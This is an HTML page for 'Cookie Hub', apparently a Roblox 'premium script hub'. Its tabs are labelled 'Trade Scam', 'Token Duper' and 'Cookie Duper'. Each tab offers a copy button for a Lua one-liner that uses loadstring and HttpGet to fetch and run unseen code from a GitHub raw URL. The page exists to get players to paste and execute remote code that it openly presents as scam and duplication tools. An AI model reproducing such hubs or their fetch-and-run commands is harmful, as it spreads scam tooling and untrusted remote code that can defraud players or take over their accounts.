<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Cookie Hub 🍪</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
  color: #fff;
  background: radial-gradient(circle at top, #3a0a6a, #000010);
  overflow: hidden;
}

/* galaxy stars */
body::before {
  content: "";
  position: fixed;
  inset: -100%;
  background:
    radial-gradient(1px 1px at 10% 20%, #fff, transparent),
    radial-gradient(1px 1px at 30% 80%, #fff, transparent),
    radial-gradient(1px 1px at 70% 40%, #fff, transparent),
    radial-gradient(1px 1px at 90% 60%, #fff, transparent),
    radial-gradient(1px 1px at 50% 50%, #fff, transparent);
  animation: stars 90s linear infinite;
  opacity: 0.5;
}

@keyframes stars {
  from { transform: translateY(0); }
  to { transform: translateY(-600px); }
}

.container {
  width: 420px;
  max-width: 92%;
  margin: 40px auto;
  background: rgba(15,15,25,0.95);
  border-radius: 18px;
  padding: 20px;
  box-shadow: 0 0 40px rgba(160,80,255,0.4);
  position: relative;
  z-index: 1;
}

.header {
  text-align: center;
}

.header h1 {
  margin: 0;
  color: #c77dff;
}

.header p {
  margin: 6px 0 10px;
  opacity: 0.85;
}

.stats {
  text-align: center;
  font-size: 14px;
  opacity: 0.9;
}

.tabs {
  display: flex;
  gap: 8px;
  margin: 18px 0;
}

.tab {
  flex: 1;
  background: #1f1f2f;
  border-radius: 12px;
  padding: 10px;
  text-align: center;
  cursor: pointer;
  font-size: 13px;
}

.tab.active {
  background: linear-gradient(135deg, #9b5cff, #c77dff);
}

.script-box {
  background: #0f0f18;
  border-radius: 14px;
  padding: 14px;
  font-family: monospace;
  font-size: 13px;
  word-break: break-all;
  min-height: 90px;
}

.copy-btn {
  margin-top: 16px;
  width: 100%;
  padding: 14px;
  border-radius: 14px;
  border: none;
  background: linear-gradient(135deg, #9b5cff, #c77dff);
  color: #fff;
  font-size: 16px;
  cursor: pointer;
}

.footer {
  text-align: center;
  margin-top: 14px;
  font-size: 12px;
  opacity: 0.6;
}
</style>
</head>

<body>
<div class="container">
  <div class="header">
    <h1>🍪 Cookie Hub</h1>
    <p>Premium Script Hub</p>
    <div class="stats">👥 Active Users: <b>189</b></div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="selectScript(0)">Trade Scam</div>
    <div class="tab" onclick="selectScript(1)">Token Duper</div>
    <div class="tab" onclick="selectScript(2)">Cookie Duper</div>
  </div>

  <div class="script-box" id="scriptBox"></div>

  <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>

  <div class="footer">© Cookie Hub</div>
</div>

<script>
const scripts = [
`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()`,

`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()`,

`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()`
];

let current = 0;
const box = document.getElementById("scriptBox");
box.textContent = scripts[0];

function selectScript(i) {
  current = i;
  box.textContent = scripts[i];
  document.querySelectorAll(".tab").forEach((t, idx) =>
    t.classList.toggle("active", idx === i)
  );
}

function copyScript() {
  navigator.clipboard.writeText(scripts[current]);
  alert("Script copied!");
}
</script>
</body>
</html>
